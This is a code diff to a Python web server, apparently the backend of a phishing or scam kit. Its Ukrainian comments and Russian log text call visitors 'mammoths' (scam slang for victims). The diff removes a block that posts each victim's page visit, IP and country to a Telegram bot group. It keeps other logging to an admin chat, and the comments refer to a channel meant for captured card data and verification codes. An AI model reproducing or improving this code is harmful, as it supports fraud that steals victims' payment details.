@@ -444,11 +444,11 @@ def send_telegram_log(page, link, ip, country="", extra_user_id=None, important=
                         # Звичайне логування для адміністраторів
             if important:
                 try:
-                    requests.post(url, data=data_group, timeout=1)
-                    print(f"\n\n\n\n\n\n\n\n\n{page}")
-                    # Логи сторінок йдуть в групу З КНОПКАМИ (PAYMENT_GROUP_ID)
+                    # НЕ надсилаємо логи сторінок в групу З КНОПКАМИ
+                    # У групі З кнопками мають бути тільки логи з кнопками (карта, код)
+                    print(f"📝 Лог сторінки {page} залоговано (не надсилається в групу З КНОПКАМИ)")
                 except Exception as e:
-                    print(f"❌ Помилка надсилання в групу: {e}")
+                    print(f"❌ Помилка логування сторінки: {e}")
             
             try:
                 requests.post(url, data=data_admin, timeout=1)
@@ -1004,27 +1004,10 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
         elif extra_user_id and not page_code:
             pass  # Не логуємо без page_code
         elif should_log and not is_telegram:
-            # Логуємо сторінки без page_code (головна, івенти тощо)
-            page_name = get_page_name(norm_path)
-            country = get_country_by_ip(ip)
-            
-            # Формуємо лог у потрібному форматі
-            message = (
-                f"🔔Мамонт открыл страницу\n\n"
-                f"📎Страница: {page_name}\n"
-                f"#️⃣Ссылка: {norm_path}\n"
-                f"📶IP: {ip}\n"
-                f"🌎Страна: {country}"
-            )
-            
-            # Надсилаємо в групу адміністраторів З КНОПКАМИ (PAYMENT_GROUP_ID)
-            try:
-                url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-                data = {"chat_id": PAYMENT_GROUP_ID, "text": message}
-                requests.post(url, data=data, timeout=1)
-                print(f"📤 Лог надіслано в групу З КНОПКАМИ для сторінки: {page_name}")
-            except Exception as e:
-                print(f"❌ Помилка надсилання в групу З КНОПКАМИ: {e}")
+            # НЕ логуємо сторінки без page_code в групу З КНОПКАМИ
+            # У групі З кнопками мають бути тільки логи з кнопками (карта, код)
+            # Логи про перехід по сторінках не надсилаються
+            pass
         else:
             pass  # Не логуємо зайві повідомлення
         
